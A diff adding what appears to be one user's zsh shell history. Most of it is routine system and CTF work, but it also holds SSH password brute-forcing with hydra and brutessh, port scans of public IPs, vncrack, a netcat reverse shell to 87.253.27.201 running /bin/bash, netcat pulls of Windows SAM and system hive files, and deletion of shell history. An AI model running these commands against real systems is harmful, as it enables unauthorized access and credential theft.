@@ -1,0 +1,3539 @@
+cf
+/home
+mffdjdskfvn
+gerfg
+bhjvvbhjv
+cd /home
+asa
+asdd
+rm .zsh_history
+rm .zsh-history
+nmap -e eth0 -sU localhost
+sudo nmap -e eth0 -sU localhost
+sudo nmap -e wlan0 -sU localhost
+vi .bash_aliases
+pgrep ini
+rot13 'asd'
+rot13 asd
+rot13 "qwerty"
+rot13 qwerty
+vi qwerty
+rm qwerty
+man e
+e
+killall screen
+killall vi
+vi -p .bash_aliases .zshrc .zshrc2 .zshrc1
+apt
+man apt
+ps aux|grep a
+ps aux|grep ala
+ps aux|grep al
+ps aux|grep root
+pgrep Kobra.1986.RUS.BDRip.XviD.AC3.-HQCLUB.avi 
+ps auxw | grep konqueror
+ps auxw | grep konqueror | grep -v grep
+alias psgrep='ps auxw | grep konqueror | grep -v grep'
+alias psgrep='ps auxw | grep $0 | grep -v grep'
+echo $1
+alias echoone='echo $1'
+echoone 123
+alias psgrep='ps auxw | grep $1'
+alias psgrep='ps auxw | grep $1 | grep -v grep'
+pgrep konqueror
+psgrep konqueror
+pgrep 123
+pgrep kon
+psgrep kon
+apt-get remove pkill
+psgrep -l kon
+which pkill
+vi /usr/bin/pkill
+sudo rename s/$/-bin/ /usr/bin/pkill /usr/bin/pgrep
+which pgrep
+man pkill-bin 
+man pkill
+pgrep konq
+sudo rename s/-bin// /usr/bin/pkill /usr/bin/pgrep
+sudo rename s/^/the./ /usr/bin/pkill /usr/bin/pgrep
+sudo rename s/^/the./ /usr/bin/pgrep-bin /usr/bin/pgrep-bin
+rename s/^/the_/ /usr/bin/pgrep-bin /usr/bin/pkill-bin
+rename s/-bin// /usr/bin/pgrep-bin /usr/bin/pkill-bin
+isudo rename s/-bin// /usr/bin/pgrep-bin /usr/bin/pkill-bin
+sudo rename s/-bin// /usr/bin/pgrep-bin /usr/bin/pkill-bin
+sudo rename s/^/the/ /usr/bin/pgrep-bin /usr/bin/pkill-bin
+sudo rename s/p/the_p/ /usr/bin/pgrep /usr/bin/pkill
+\
+jkijojioij
+zcalc
+vi .\
+\
+
+map
+list_mappings
+\:map
+sh
+time sh
+kmap
+dirf
+grep T
+dmesg T
+man zls
+vi .zsh
+kill 9688
+pgrep konqeror
+rm .zcalc_history .zshrc2 .zshrc1
+vi .xinitrc\
+\
+
+sudo rename s/the_// /usr/bin/the_pgrep /usr/bin/the_pkill
+echo 1
+pgrep fi
+man pgrep
+regexp
+nmap 178.137.20.197
+nmap 178.49.24.106
+nmap -Pn 178.49.24.106
+nmap -Pn 178.94.145.190
+pkill squid
+pkill 5817
+pgrep squid
+telnet -p 4899 178.94.145.190
+telnet  178.94.145.190 4899
+nmap -p 4899  178.94.145.190 
+nmap -I -p 4899  178.94.145.190 
+nmap -sI -p 4899  178.94.145.190 
+sudo nmap -sI -p 4899  178.94.145.190 
+sudo nmap -sV -p 4899  178.94.145.190 
+traceroute ya.ru
+mkpasswd
+apt-cache search mkv
+sudo dragon
+pip install pexpect
+pip-2.7 install pexpect
+python2.4
+python2.5
+cpan
+git
+wget http://narod.ru/disk/start/09.dl3sf-narod.yandex.ru/5338472001/hb255d894e51b290c6e8b9919eb8af737/leprohouse0711.mp3
+pon dsl-provider 
+apt-get install chrome
+apt-cache search tron
+apt-cache search tron G tron
+apt-cache search tron G \<tron
+apt-cache search tron E \<tron
+apt-cache search tron E tron 
+apt-get install xtron gltron
+whoami
+route ya.ru
+resolveip ya.ru
+apt-cache search tron G tron 
+apt-cache search go
+apt-cache search go G og
+apt-cache search go G go
+apt-get install jago
+apt-get install ggo
+apt-get install gnugo
+gnugo
+kill kpowersave&
+kill kpowersave
+kill 6090
+pgrep wine
+apt-get install pidgin pidgin-encryption pidgin-plugin-pack pidgin-themes
+lynx les22.htm
+kill exe
+kill 6785
+pkill wine
+pkill Skype
+pkill lkads.exe
+pkill lktsrv.exe
+pkill services.exe
+pkill nidmsrv.exe
+pkill explorer.exe
+pgrep exe
+wget http://www.helloworld.ru/texts/comp/lang/delphi/delphi1/les22.htm
+wget http://dqqd.ws/test/woklye.php
+vi /etc/ppp/chap-secrets
+nmap    habrahabr.ru
+echo $PAGER
+/etc/zsh
+/pentest/python/impacket-examples/win_echod.py
+vi /pentest/python/impacket-examples/win_echod.py
+cat .zhistory G vi
+cat .zhistory G vi -p
+cat .zhistory G 'vi -p'
+rename s/ACDC - // *.mp3
+rename s/ACDC - // *
+sudo rename s/ACDC - // *
+apt-cache search grc
+ping radio-t.com
+зу�тп
+wget http://mds.podfm.ru/171/download/8746.mp3
+vi /etc/init.d/rc
+sudo rm etc/rc5.d/S30squi
+sudo rm /etc/rc5.d/S30squid
+sudo rm /etc/rc4.d/S30squid /etc/rc2.d/S30squid /etc/rc3.d/S30squid /etc/rc4.d/S30squid  
+sudo rm /etc/rc2.d/S30squid /etc/rc3.d/S30squid /etc/rc4.d/S30squid  
+py
+plolog
+xtron
+gltron
+iftop -i ppp0
+apt-cache search teeworlds
+apt-cache search savage
+apt-cache search warsow
+warsow
+teeworlds
+atop
+apt-cache search top
+apt-cache search top G top
+apt-get install iftop
+sudo iftop
+sudo iftop ppp0
+sudo iftop -i ppp0
+apt-cache search hedgewars
+apt-get install hedgewars
+apt-get install warsow teeworlds
+iftop
+vi /boot/grub/menu.lst
+vi /etc/default/acpi-support
+vi /etc/default/acpid
+apt-get install suspend
+uname -rv
+sudo suspend
+which suspend
+kill 6033
+mplayer tv:// -tv device=/dev/video1
+l /dev/vi*
+mplayer tv:// -tv device=/dev/video0
+screen -x
+which firefox
+unpack t3mp/firefox-3.6.13.tar.bz2
+l firefox/
+sudo firefox/updater 
+rm -rf firefox/
+sudo dpkg -i t3mp/google-chrome-stable_current_i386.deb
+sudo dpkg -i install_flash_player_10_linux.deb
+unpack t3mp/firefox-4.0b11.tar.bz2
+sudo mv firefox4b/ /usr/share/ 
+l /usr/share/firefox4b  
+/usr/share/firefox4b/firefox   
+sudo ln -s /usr/share/firefox4b/firefox /usr/bin/firefox4b  
+whereis google-chrome
+kill 6103
+pppoeconf 
+kill 6086
+kill 6650
+pon d`
+echo 'c8aceec2db05f0f2' > word
+pppconfig
+pppconf
+sudo pppconfig
+vi /etc/ppp/peers/dsl-provider 
+vi /etc/ppp/peers/home
+vi -p win_t3mp/books/Су�емотеу�ника/I win_t3mp/books/Су�емотеу�ника/II
+pon home
+sudo pon home
+pppoec
+зду�п
+kill 7151
+kill 6524
+
+cd n_v1linux
+apt-get install sudo apt-get install libstdc++2.10-glibc2.2
+apt-get install libstdc++2.10-glibc2.2
+apt-get install libstdc++2.10 glibc2.2
+apt-get install libstdc++2.10-dev
+apt-get install glibc-2.10-1
+sudo apt-get install libstdc++6-4.3-dev
+./n_v14
+apt-get install libstdc++2.10-glibc2.2 
+cat word
+unpack t3mp/n_v1linux.tar.gz
+sudo apt-get install libstdc++2.10-glibc2.2
+cd t3mp
+dpkg libstdc++2.10-glibc2.2_2.95.4-24_i386.deb
+dpkg -i libstdc++2.10-glibc2.2_2.95.4-24_i386.deb
+sudo dpkg -i libstdc++2.10-glibc2.2_2.95.4-24_i386.deb
+./n_v1linux/n_v14
+chmod 777 t3mp/task.out
+t3mp/task.out
+sh t3mp/task.out
+gdb task.out
+gvim -b 5
+vi -b
+vi -b cr.exe
+vi -h
+vi  cr.exe
+vi 5
+write 
+apt-cache search dicm
+apt-get install aeskulap
+aeskulap
+l ./task.out
+la ./task.out
+./task.out
+vi task.out
+vi t3mp/ructf.img
+sudo mount t3mp/ructf.img temp
+sudo mount -o loop t3mp/ructf.img temp
+mount -o loop t3mp/ructf.img ~/temp
+sudo mount -o loop t3mp/ructf.img ~/temp
+chmod 777 task.out
+xmodmap house/5
+xmodmap house/1
+xmodmap house/2
+xmodmap house/1.dicom
+apt-cache search dicom
+apt-get install dcmtk
+nikto.pl
+nikto.pl 10.28.200.5
+nikto.pl -host 10.28.200.5
+brutessh.py
+brutessh.py -h 10.28.200.5 -u team31 -d /pentest/passwords/wordlists/bt4-password.txt
+hydra 10.28.200.5 -l team31 -p /pentest/passwords/wordlists/bt4-password.txt
+hydra -l team31 -p /pentest/passwords/wordlists/bt4-password.txt 10.28.200.5
+sudo hydra -l team31 -p /pentest/passwords/wordlists/bt4-password.txt 10.28.200.5
+hydra -l team31 -p /pentest/passwords/wordlists/bt4-password.txt -W 10.28.200.5
+vi /etc/openvpn/team31.conf
+l /etc/openvpn/
+nmap 10.27.31.*
+nmap 10.26.0.1
+sudo ifconfig tun0:0 10.27.31.2
+sudo ifconfig tun0:1 10.27.31.3
+ping 10.27.31.1
+ping 10.27.31.2
+ping 10.27.31.3
+ping  10.28.200.5
+ping 10.26.0.1
+nmap 10.28.200.5
+nmap -Pn 10.28.200.5
+nmap -p 22 10.28.200.5
+nmap -A 10.28.200.5
+ssh 10.28.200.5
+ssh 10.28.200.5@team31
+ssh 10.28.200.5 
+ssh 10.28.200.5 team31
+ping 10.28.200.5 
+ping 10.28.200.5 -l team31
+sudo ssh 10.28.200.5 team31
+sudo ssh 10.28.200.5 -l team31
+sudo /etc/init.d/openvpn restart
+unpack t3mp/hdd.7z
+/pentest/passwords/brutessh/brutessh.py -h 10.28.200.5 -u team31 -d /pentest/passwords/wordlists/bt4-password.txt
+openvpn --config team31.conf --daemon
+sudo openvpn --config team31.conf --daemon
+ifconfig tun0
+leaf
+apt-cache search leaf
+apt-cache search leaf G leaf
+edb
+nmap -Pn 10.7.17.193
+pger ftp
+pgrep ftp
+sudo /etc/init.d/atftpd start
+l /etc/init.d/ G ftp
+ps aux G ftp
+objdump -s task.out
+objdump -d task.out
+objdump -d task.out G int
+objdump -d task.out G init
+objdump -d task.out 
+objdump -d task.out > dump
+wine cr.exe
+strings perl58.dll
+strings perl58.dll G file
+strings perl58.dll G truth
+strings task.out
+sudo cp ubuntu-10.10_netbook-i386.iso /media/disk/
+OB
+q\
+
+q
+md5 tricky_1.gif
+md5sum tricky_1.gif
+md5sum ../22/Color_1.gif
+md5sum 11/tricky_1000.gif
+md5sum 22/Color_100.gif
+cd 11
+nc
+md5sum tricky_10.gif ../22/Color_10.gif
+foremost ructf.img
+cd /media/flash
+cd disk/ctf
+cd disk
+cp ctf /tmp
+cp -R ctf /tmp
+cd /tmp
+cd ctf
+nano output.txt
+xvie out.jpg
+nano do.py
+python do.py output.txt
+kview out.jpg
+kview out.bmp
+cp out.bmp /media/disk
+sudo cp out.bmp /media/disk
+sudo cp out.bmp /media/disk/
+vi md5.py
+apt-cache search image compare
+apt-get install mc
+mc
+ghc nfs.hs
+man ghc -v
+ghc nfs.hs -v
+ghc nfs.hs 
+sudo mount -o loop ructf.img disc
+apt-cache search image magik
+apt-cache search  magik
+apt-cache search  magick
+apt-cache search image magick
+vi /etc/scalpel/scalpel.conf
+sudo rm -rf scalpel-output
+scalpel ructf.img
+sudo rm -rf /media/flash
+cp out.bmp /media/flash
+sudo cp out.bmp /media/flash
+vi crypt_message
+vi pr0jects/perl/pontiefix/Solitaire.pm\\
+
+vi pr0jects/perl/pontiefix/Solitaire.pm\
+
+vi crypt.pl
+wget http://podcast.umputun.com/downloads/ump_podcast264.mp3
+wget http://podcast.umputun.com/downloads/ump_podcast265.mp3
+scalpel hdd/1.vdi
+kill 7849
+sudo kill 7849
+kill 8350
+wine pe.exe
+wget http://quals2011.ructf.org/static/JoyStory/300/radio.wav
+kill 6642
+echo -e «import os\nprint 'Current working dir is %s' % os.getcwd()» | python
+import os; print 'Current working dir is %s' % os.getcwd()
+py 'import os; print 'Current working dir is %s' % os.getcwd()'
+py 'import os; print "Current working dir is %s" % os.getcwd()'
+time py 'import os; print "Current working dir is %s" % os.getcwd()'
+pip tesser
+pip install tesser
+sudo pip install pytesser
+pip -h
+pip -v
+pip-2.7 pytesser
+sudo pip-2.7 pytesser
+apt-get remove python2.7
+apt-get remove python-2.7
+ipythonx
+wget http://narod.ru/disk/start/08.dl3d-narod.yandex.ru/6212686001/h0f7eaa848735fa9e96a697a7cfc691ba/kukushka_i_slon.rar
+upack kukushka_i_slon.rar
+genpass
+genpass 1
+vi 1
+la 1
+ll 1
+Eterm
+vi /etc/inputrc
+pgrep 1
+6428
+ps 6428
+open 6428
+go 6428
+kill 6428
+rm .zshrc.swp
+cal
+man zshcalsys
+man calendar
+which calendar
+whereis calendar
+vi /etc/calendar/
+vi /usr/share/calendar/calendar.ubuntu
+vi /usr/share/calendar/calendar.computer
+vi /usr/share/calendar/ru_RU/calendar.orthodox
+calendar
+gvim .zhistory
+vim .zhistory
+sudo rm -rf output
+xmodmap -e "remove lock = Caps_Lock"
+vi .Xmodmap
+xmodmap -e "clear lock"
+rm .Xauthority
+ls *.swp
+ls *swp
+ls G swp
+pgrep fier
+pgrep fire
+firefox.ubuntu
+google-chrome
+lynx
+l .vim/backup
+ll .vim/backup
+ll .vim/backup/\~
+vi pr0jects/perl/pontiefix/Solitaire.pm
+man pr0jects/perl/pontiefix/Solitaire.pm
+perl pr0jects/perl/pontiefix/Solitaire.pm -h
+whereis perl
+/usr/share/perl/5.10/Module
+sudo find / -name .pm
+sudo find / -name *.pm
+sudo find / -name *pm
+sudo find / -name *lp
+groups
+vi /etc/wicd/wired-settings.conf
+vi /etc/wicd/wireless-settings.conf
+vi /etc/group
+у�ску�у�т
+ipython2.5
+rtorrent 
+dropbox puburl joy400.py
+./start.pl
+perl ./start.pl
+vi start.pl
+sudo dropbox start
+sudo rm -rf t3mp/Dropbox
+man dropbox
+gropbox help
+dropbox help
+pgrep drop
+dropbox running
+dropbox puburl t3mp/Dropbox/Public/joy400.py
+sudo dpkg --clear-avail
+sudo dpkg -i t3mp/downloads/skype-debian_2.0.0.63-1_i386.deb
+l *.py
+l y$
+nmap lo
+nmap -Ps 127.0.0.1
+dropbox stop
+ping tortilla.ru
+l /etc/v*
+lspci | grep VGA
+vi /etc/zsh/zshenv
+vi /etc/zsh/zlogin
+vi /etc/zsh/zlogout
+vi /etc/zsh/zprofile
+vi /etc/zsh/zshrc
+ps -x o tt
+ps -x o pid
+ps -x 
+psg 7368
+pgr 7385
+mkdir .zsh
+vi .zsh/comp_dropbox
+man zshcompctl
+rm -rf .zsh
+whereis zsh
+vi /usr/share/zsh
+l /usr/share/zsh
+l /usr/share/zsh/functions/TCP
+cat /usr/share/zsh/functions/TCP/tcp_alias
+cat /usr/share/zsh/functions/Misc.zwc
+man rm
+l *.swp
+rm .1.swp
+rm *swp
+l G swp
+ll G swp
+sudo rm .rtorrentInit.sh.swp
+rm *.swp
+rm \*.swp
+alias vi='vim'
+py 1+2
+py print 1+2
+py "print 1+2"
+pl "$i=1;print$i"
+py print 1
+pl $i=1;print$i
+perl -e "$i=1;print$i"
+perl -e "$i=1;print $i"
+perl -e "$i='1';print $i"
+perl -e '$i="hello";print $i'
+pl
+pl $i="hello";print$i
+ipython2.5 joy400.py
+poweroff
+gvim -p *.py *.pl
+gvim -p .py .pl
+kill 6781
+ifup tun0
+sudo ifup tun0
+sudo ifconfig tun0 192.168.0.1
+kill 6014
+psa aux
+ps aux
+h
+qqqqwerty
+ping 192.168.0.2 
+nc 192.168.0.2 3129
+pack tar win_t3mp/ructf/ructf2008/*
+l win_t3mp/ructf/ructf2008/*
+nc 192.168.0.2 3129 < win_t3mp/ructf/ructf2008/ructf2008-image.tar.gz
+wget http://pirates.radio-t.com/downloads/rt228post.mp3
+nc 10.7.17.180 1234
+nc 10.7.17.180 1234 < joy400.py
+nmap -p 69 127.0.0.1
+whereis tftp
+pgrep
+which start-tftpd
+start-tftpd
+vi /usr/bin/start-tftpd
+whereis tftpd
+whereis atftpd
+atftpd
+atftpd --daemon /tmp
+pgr ftp
+atftpd  /tmp
+sudo atftpd /tmp
+tftp
+cd wtorrent-project-read-only/wtorrent/
+cp install.php /var/www
+sudo cp install.php /var/www
+sudo cp install.php /var/www/wtorrent
+sudo rm /var/www/install.php
+chown -R www-data:www-data ./wtorrent/
+chown -R www-data:www-data /var/www/wtorrent/
+rm -rf /var/www/wtorrent
+mkdir /var/www/wtorrent
+sudo cp * /var/www/wtorrent
+sudo cp -rf * /var/www/wtorrent
+sudo chown 777  /var/www/wtorrent/*
+sudo chown -R www-data:www-data /var/www/wtorrent/
+sudo mkdir /var/www/wtorrent
+cd /var/www/wtorrent
+svn checkout http://wtorrent-project.googlecode.com/svn/trunk/ wtorrent-project-read-only
+sudo svn checkout http://wtorrent-project.googlecode.com/svn/trunk/ wtorrent-project-read-only
+sudo chown -R www-data:www-data /var/www/wtorrent/*
+sudo rm -rf /var/www/wtorrent
+cd /var/www
+svn checkout http://rutorrent.googlecode.com/svn/trunk/rutorrent
+sudo svn checkout http://rutorrent.googlecode.com/svn/trunk/rutorrent
+chown -R www-data:www-data ./rutorrent/
+sudo chown -R www-data:www-data ./rutorrent/
+sudo chown -R www-data:www-data ./mtos
+l mtos
+chmod 220 .vimrc
+chmod 440 .vimrc
+chmod 660 .vimrc
+la .vimrc
+ll .vimrc
+lls .wine
+man lls
+lls .zshrc
+chmod 664 .wine
+sudo ll .wine
+sudo ls .wine
+sudo ls -a .wine
+sudo ls -u .wine
+sudo chmod 674 .wine
+sudo chmod 777 .wine
+sudo chmod 776 .wine
+sudo chmod 774 .wine
+sudo chmod 664 .wine
+sudo chmod 764 .wine
+ll .wine
+l /var/www/htdig
+l /var/www/base
+rm -rf /var/www/mtos
+sudo rm -rf /var/www/mtos
+ll /var/www/base
+/pentest/exploits/exploitdb/searchsploit
+/pentest/exploits/exploitdb/searchsploit windows
+/pentest/exploits/exploitdb/searchsploit linux
+/pentest/exploits/exploitdb/searchsploit ubuntu
+l /pentest/exploits/exploitdb/
+search-path
+ln -s /pentest/exploits/exploitdb/searchsploit /usr/bin/
+sudo ln -s /pentest/exploits/exploitdb/searchsploit /usr/bin/
+l /pentest/exploits/exploitdb/platforms
+ls /pentest/exploits/exploitdb/platforms
+ll /pentest/exploits/exploitdb/platforms
+ll /pentest/exploits/exploitdb/platforms > vi
+pd
+vi vi
+vi basic.vba
+vi basic.vb
+wget http://www.exploit-db.com/archive.tar.bz2
+upack archive.tar.bz2
+nmap -Pn 127.0.0.1
+nmap -Pn -p 9876 127.0.0.1
+nmap -Pn -O -p 9876 127.0.0.1
+sudo nmap -Pn -O -p 9876 127.0.0.1
+sudo nmap -Pn -O  127.0.0.1
+upack t3mp/downloads/Python-2.7.1.tgz
+python Python-2.7.1/setup.py
+vi Python-2.7.1/README
+Python-2.7.1/configure
+cd Python-2.7.1
+./configure
+cat config.log
+v
+pgrep aql
+pgrep sql
+make altinstall
+sudo make altinstall
+easy_install-2.7
+easy_install-2.7 pip
+easy_install-2.7 install pip
+sudo easy_install-2.7 install pip
+sudo easy_install-2.7  pip
+pip-2.7 install
+pip-2.7 freeze
+pip-2.5 freeze
+sudo pip install SciPy
+l /etc/init.d G sql
+pip
+pip help
+pip zip
+sudo chod +x /opt/leo/install
+/opt/leo/install
+l/usr/local/lib/leo/core/
+l /usr/local/lib/leo/core/
+echo $PATH
+l /usr/local/l*
+l /usr/local/le*
+ln -l /usr/local/bin/leo /usr/bin/leo
+ln -s /usr/local/bin/leo /usr/bin/leo
+sudo ln -s /usr/local/bin/leo /usr/bin/leo
+/usr/bin/leo
+apt-get remove leo
+sudo rm /usr/bin/leo
+sudo rm /usr/local/bin/leo 
+apt-get install leo
+sudo chmod +x /opt/leo/install
+upack t3mp/downloads/Leo-4.8-final.zip
+./Leo-4.8-final
+sudo easy_install-2.7 PyQt
+apt-get install python2.5-tk
+apt-get install python2.5-qt4
+python launchLeo.py
+sudo pip install iptthon
+sudo pip install ipython
+sudo pip-2.7 install ipython
+sudo pip install --upgrade ipython 
+l /pentest
+l /pentest/backdoors
+l /pentest/backdoors/web
+l /pentest/bluetooth
+l /pentest/bluetooth/blackhat
+vi  /pentest/bluetooth/blackhat/README
+vi  /pentest/cisco
+l /pentest/cisco
+l /pentest/database
+l /pentest/enumeration
+l /pentest/enumeration/www
+l /pentest/exploits
+l /pentest/forensics
+l /pentest/forensics/volatility
+vi /pentest/forensics/volatility/README.txt
+vi /pentest/fuzzers
+l /pentest/fuzzers
+l /pentest/misc
+l /pentest/tunneling
+l /pentest/tunneling/3proxy
+vi /pentest/tunneling/3proxy/Readme
+/pentest/tunneling/3proxy/proxy --help
+/pentest/tunneling/3proxy/doc
+vi ru/example1.txt
+gvim ru/example1.txt
+Q\
+Q\
+Q\
+Q\
+Q\
+Q\
+Q\
+1
+sudo gvim ru/example1.txt
+sudo vim ru/example1.txt
+apt-cache search blas G blas
+apt-cache search libblas
+apt-get install libblas3gf libblas-dev
+apt-get install liblapack3gf liblapack-dev
+apt-get install libatlas-base-dev
+apt-cache search f77
+apt-cache search gnu95
+apt-cache search fortan
+apt-cache search fortran
+apt-cache search fortran G fortran
+apt-cache search fortran compiler
+apt-get install gfortran
+sudo pip install scipy
+sudo pip freeze
+sudo pip install PyQT
+pip search Qt
+sudo pip search Qt
+sudo pip search PyQt
+sudo pip install PyQt
+sudo pip install pyqt
+sudo pip install sip
+vi .kde/share/config/kwinrc
+sudo vi .kde/share/config/kwinrc
+kwin --replace
+python configure.py
+man route
+grep "href=" ru.html
+grep "href=" ru.html | cut -d"/" -f3
+grep "href=" ru.html | cut -d"/" -f3 | grep icq.com
+grep "href=" ru.html | cut -d"/" -f3 | grep icq.com | sort -u
+grep "href=" ru.html | cut -d"/" -f3 | grep icq.com | sort -u > links
+vi links
+/pentest/enumeration/list-urls/list-urls.py ru.html
+sudo ./make
+python2.7 configure.py
+sudo python2.7 configure.py
+make
+sudo make
+sudo make install
+apt-get install hg
+apt-get install mercurial
+hg clone https://pythonxy-linux.googlecode.com/hg/ pythonxy-linux 
+python2.7 setup.py
+sudo pip install Tk
+sudo pip install Tkl
+sudo pip install tkinter
+sudo pip install TkInter
+sudo mv /usr/share/leo-4.8 ~/
+l2ping\
+	
+leo-4.8/launchLeo.py
+vi leo-4.8/launchLeo.py
+python2.7 leo-4.8vi lel
+python2.7 leo-4.8vivi lel
+python2.7  .leo-4.8/setup.py
+cd .leo-4.8/
+rename s/.// .leo-4.8
+socat
+socat -h
+sudo easy_install-2.7 matplotlib
+python2.7 leo-4.8/launchLeo.py
+apt-get install python3.2
+pip search tk
+pip search tkinter
+apt-get search pythonxy
+apt-cache search pythonxy
+cd q3_linux
+vi cd-key
+./q3_install.sh
+sudo ./q3_install.sh
+kill 7224
+vncconnect 10.7.17.177
+vncviewer 10.7.17.177
+vncrack 10.7.17.177
+sudo vncrack 10.7.17.177
+sudo vncconnect 10.7.17.177
+sudo vncviewer 10.7.17.177
+vi .vnc/passwd
+rm -rf .vnc/
+ioquake3
+apt-get install nessus
+kill 5672
+ipython 
+sudo cp /opt/leo/launchLeo.py  /usr/local/lib/leo/core/
+sudo /opt/leo/install
+sudo vi /usr/local/bin/leo
+rename s/$/-bt/ /usr/local/bin/leo
+sudo rename s/$/-bt/ /usr/local/bin/leo
+cwd
+p
+python2.7 
+d
+./leo-4.8
+python2.7 launchLeo.py
+vi INSTALL.TXT
+./leo/core/runLeo.py
+python2.7 ./leo/core/runLeo.py
+l /usr/share/leo-4.8/INSTALL.TXT
+vi /usr/share/leo-4.8/INSTALL.TXT
+sudo chmod 755 leo
+sudo chmod 755 /u/b/leo
+sudo chmod 755 /usr/bin/leo
+sudo vi /usr/bin/leo
+grep leo .zshrc
+grep leo .zhistory
+python2.7 ./leo-4.8/launchLeo.py
+python2.7./leo-4.8/leo/core/runLeo.py
+python2.7/leo-4.8/leo/core/runLeo.py
+python2.7 /leo-4.8/leo/core/runLeo.py
+python2.7 ./leo-4.8/leo/core/runLeo.py
+leo-bt
+./leo-4.8/setup.py
+./leo-4.8/setup.py cmd --help
+./leo-4.8/setup.py --help
+./leo-4.8/setup.py build
+sudo ./leo-4.8/setup.py build
+sudo /home/s0v/leo-4.8/setup.py build
+sudo python2.7 /home/s0v/leo-4.8/setup.py build
+sudo python2.7 /home/s0v/leo-4.8/setup.py clean
+./leo-4.8/setup.py --help-commands
+sudo python2.7 /home/s0v/leo-4.8/setup.py install
+leo
+vi /usr/bin/leo
+cp leo-4.8/leo/Icons/application-x-leo-outline.png /usr/share/icons
+sudo cp leo-4.8/leo/Icons/application-x-leo-outline.png /usr/share/icons
+modprobe hci_usb
+/etc/init.d/bluetooth start
+hcitool scan
+hcitool 
+hcitool -i dev
+hcitool -i btusb
+l /dev G bt
+l /dev G b
+l /dev
+l /dev G hc
+vi .script/mail.py
+kill 8117
+sudo mount -o loop win_t3mp/xa.iso
+rm -rf /usr/share/firefox4b
+sudo rm -rf /usr/share/firefox4b
+sudo mv -rf firefox-4rc /usr/share
+sudo mv -f firefox-4rc /usr/share
+l /usr/share/firefox-4rc
+/usr/share/firefox-4rc/firefox-bin
+/usr/share/firefox-4rc/firefox
+rm -rf /usr/share/firefox-4rc/
+sodo rm -rf /usr/share/firefox-4rc/
+sudo rm -rf /usr/share/firefox-4rc/
+./firefox/firefox
+chmod +x ./firefox/firefox-bin
+./firefox/firefox-bin
+rm -rf firefox
+l /usr/share/firefox
+la /usr/share/firefox
+upack t3mp/downloads/firefox-4.0rc1.tar.bz2
+firefox/run-mozilla.sh
+firefox/updater
+firefox/README.txt
+apt-get remove firefox
+firefox-3.0
+apt-get remove firefox-3.0 firefox-3.0-branding firefox-mozilla-build
+lsusb
+firefox4b
+sudo rm /usr/bin/firefox4b
+firefox/firefox
+mv -f firefox /usr/share
+sudo mv -f firefox /usr/share
+sudo mv -rf firefox /usr/share/
+sudo mv -f firefox /usr/share/
+sudo cp -rf firefox /usr/share/
+ln -s /usr/share/firefox/firefox /usr/bin/firefox
+sudo ln -s /usr/share/firefox/firefox /usr/bin/firefox
+firefox
+echo "11" | perl -e "print $_ x 3"
+echo "11" | perl -e "print 'start' . $_ x 3"
+echo "11" | perl -e "s/11/22/;print 'start' . $_ x 3"
+echo "11" | perl -e "$_ =~s/11/22/;print 'start' . $_ x 3"
+echo "11" | perl -e "$_ =~ s/11/22/;print 'start' . $_ x 3"
+echo "11" | perl -e "s/11/22/;print"
+echo "11" | perl -e "s/11/22/;print $_"
+echo "12" | perl -e ";print $_ =~ s/(\d)(\d)/$2$1/"
+echo "12" | perl -e ";print $_ =~ s/(.)(.)/$2$1/"
+echo "12" | perl -e "chomp $_;print $_ =~ s/(.)(.)/$2$1/"
+echo "12" > perl -e ";print $_ =~ s/(.)(.)/$2$1/"
+echo "12" > perl -e ";print $_"
+echo "12" >>] perl -e ";print $_"
+echo "12" >> perl -e ";print $_"
+echo "12" | perl -e ";print $_"
+echo "12" | cut -b1
+echo "12word34" | cut -c4
+myip | cut -c6-
+myip | cut -c8-
+myip | cut -c 16-
+myip | cut -c 26-
+myip | cut -c 25-
+myip | cut -c 25- | cut -c -15
+myip | cut -f 1-4 -d .
+myip | cut -f 2-3 -d .
+myip | cut -f 5 -d " "
+apt-cache search touchegg
+dpkg -i t3mp/downloads/touchegg_0.2-maverick_i386.deb 
+sudo dpkg -i t3mp/downloads/touchegg_0.2-maverick_i386.deb 
+rm t3mp/downloads/touchegg_0.2-maverick_i386.deb 
+apt-cache search vkontakte
+apt-cache search vk.com
+nc -lvvp 4444
+ll G swp | cut -f 7-8 -d " "
+ll G swp | cut -f 1 -d " "
+ll G swp | cut -f 5 -d " "
+ll G swp | cut -f 6 -d " "
+ll G swp | cut -f 10 -d " "
+for file in $(ll G swp | cut -f 13 -d " "); do rm file; done
+for file in $(ll G swp | cut -f 13 -d " "); do rm $file; done
+ll G swp | cut -f 13 -d " "
+cd icq/
+for file in $(ll | cut -f 13 -d " "); do rm $file; done
+for file in $(l | cut -f 13 -d " "); do rm $file; done
+l | cut -f 13 -d " "
+ll | cut -f 13 -d " "
+ll | cut -f 12 -d " "
+ll | cut -f 11 -d " "
+ll 
+ll | cut -f 10 -d " "
+ll | cut -f 1 -d " "
+ll | cut -f 2 -d " "
+ll | cut -f 3 -d " "
+la | cut -f 10 -d " "
+for file in $(l); do rm $file; done
+man nc
+nc -v 87.253.27.201 4444 -e /bin/bash
+man record
+arecord
+arecord >> dump
+/pentest/enumeration/google/goog-mail/goog-mail.py bill.co.il
+/pentest/enumeration/google/goog-mail/goog-mail.py bll.co.il
+whois google.com
+whois ya.ru
+whois oxod.ru
+whois utros.ru
+apt-get install glash
+apt-get -f install klash
+kill screen
+python .script/mail.py
+wget http://narod.ru/disk/start/19.dl29sf-narod.yandex.ru/7232336001/h5af1a56535a360c46a055b5750555167/himeksperimentgr112.avi
+sudo mount t3mp/downloads icq
+sudo mount t3mp/torrent/Ѓ�ниги\ Ѓ�артина\CRACKL@B_SUN_DVD_2010.iso
+man n mount t3mp/torrent/Ѓ�ниги\ Ѓ�артина\CRACKL@B_SUN_DVD_2010.isoc
+sudo mount t3mp/torrent/CRACKL@B_SUN_DVD_2010.iso icq
+sudo mount -o loop t3mp/torrent/CRACKL@B_SUN_DVD_2010.iso icq
+import http_proxy='http://proxy.lan:3128'
+wget http://download81.files.mail.ru/M6GSBU/b106dac6499610891e987526fa95f229/house0716.mp3
+gnash
+\
+apt-get install gnash
+tcpdump -l
+man tcpdump 
+sudo  tcpdump 
+man wireshark
+la .kde3
+resolveip 10.7.17.2
+lynx ya.ru
+lynx http://ya.ru
+host proxy.lan
+resolveip 10.7.0.2
+ping 10.7.17.176
+sudo ssh 10.7.17.176
+ssh 10.7.17.176
+ssh -u root 10.7.17.176
+ssh -l root 10.7.17.176
+nc 10.7.17.176 1234 > SAM
+vi SAM
+nc 10.7.17.176 1234 > system
+whois yar.ru
+ssh 10.7.17.117
+rdesktop
+apt-cache search pojector
+apt-cache search projector
+xrandr --output VGA --mode 1024x768 --output LVDS --mode 1024x600
